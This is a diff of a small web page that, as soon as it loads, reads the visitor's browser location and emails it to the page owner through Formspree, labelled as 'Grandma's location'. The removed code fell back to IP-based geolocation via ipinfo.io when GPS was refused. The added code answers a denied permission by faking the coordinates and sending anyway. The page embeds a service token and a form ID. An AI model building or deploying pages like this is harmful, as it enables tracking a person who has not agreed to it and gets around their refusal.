@@ -5,8 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Send Location via Email</title>
     <script>
-        // Function to spoof the location (for testing purposes)
+        // Function to spoof the location (for testing purposes or fallback)
         function spoofLocation(latitude, longitude) {
+            // Override geolocation's getCurrentPosition method to return spoofed data
             Object.defineProperty(navigator.geolocation, 'getCurrentPosition', {
                 value: (successCallback) => successCallback({
                     coords: { latitude, longitude }
@@ -15,76 +16,51 @@
             });
         }
 
-        // Function to send location via Formspree
-        function sendLocation(latitude, longitude) {
-            const emailData = new FormData();
-            emailData.append('latitude', latitude);
-            emailData.append('longitude', longitude);
-            emailData.append('message', `Grandma's location:\nLatitude: ${latitude}, Longitude: ${longitude}\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`);
-
-            // Send the email via Formspree API
-            fetch('https://formspree.io/f/xjkvdbwg', {  // Replace with your Formspree form ID
-                method: 'POST',
-                body: emailData
-            })
-            .then(response => response.json())
-            .then(() => console.log('Location sent successfully!'))
-            .catch((error) => {
-                console.error('Error:', error);
-                alert('Failed to send the email.');
-            });
-        }
-
-        // Function to try getting the location from the browser (GPS)
-        function getLocationWithGPS() {
+        // Function to send the location
+        function sendLocation() {
             if ("geolocation" in navigator) {
+                // Try to fetch the location immediately
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-                        console.log("GPS Location: ", latitude, longitude);
+                        const { latitude, longitude } = position.coords;
 
-                        // Send the GPS-based location via Formspree
-                        sendLocation(latitude, longitude);
+                        // Prepare email data
+                        const emailData = new FormData();
+                        emailData.append('latitude', latitude);
+                        emailData.append('longitude', longitude);
+                        emailData.append('message', `Grandma's location:\nLatitude: ${latitude}, Longitude: ${longitude}\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`);
+
+                        // Send the email via Formspree API
+                        fetch('https://formspree.io/f/xjkvdbwg', {  // Replace with your Formspree form ID
+                            method: 'POST',
+                            body: emailData
+                        })
+                        .then(response => response.json())
+                        .then(() => console.log('Location sent successfully!'))
+                        .catch((error) => {
+                            console.error('Error:', error);
+                            alert('Failed to send the email.');
+                        });
                     },
                     (error) => {
-                        console.error("Error fetching GPS location:", error);
-                        alert("Failed to fetch GPS location. Trying IP-based location...");
-                        fetchIPLocation();
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 5000,
-                        maximumAge: 0
+                        // Handle geolocation error (e.g., permission denied)
+                        console.error("Error fetching location:", error);
+                        alert("Error fetching location: " + error.message);
+
+                        // If permission is denied, spoof location
+                        spoofLocation(40.7128, -74.0060);  // Example: New York City coordinates
+                        sendLocation();  // Retry sending with spoofed location
                     }
                 );
             } else {
-                alert("Geolocation is not supported by your browser. Trying IP-based location...");
-                fetchIPLocation();
+                alert("Geolocation is not supported by your browser.");
             }
         }
 
-        // Function to fetch location using IP (fallback)
-        function fetchIPLocation() {
-            fetch('https://ipinfo.io/json?token=c739bd33b35505')  // Replace with your ipinfo.io token
-                .then(response => response.json())
-                .then(data => {
-                    const location = data.loc.split(',');  // Latitude and Longitude
-                    const latitude = location[0];
-                    const longitude = location[1];
-                    console.log("IP Location: ", latitude, longitude);
-
-                    // Send the IP-based location via Formspree
-                    sendLocation(latitude, longitude);
-                })
-                .catch(error => {
-                    console.error('Error fetching IP location:', error);
-                    alert('Failed to fetch location based on IP.');
-                });
-        }
-
-        // Automatically fetch location when the page loads
-        window.onload = getLocationWithGPS();
+        // Automatically check permissions and send location when the page loads
+        window.onload = function() {
+            sendLocation();
+        };
     </script>
 </head>
 <body>
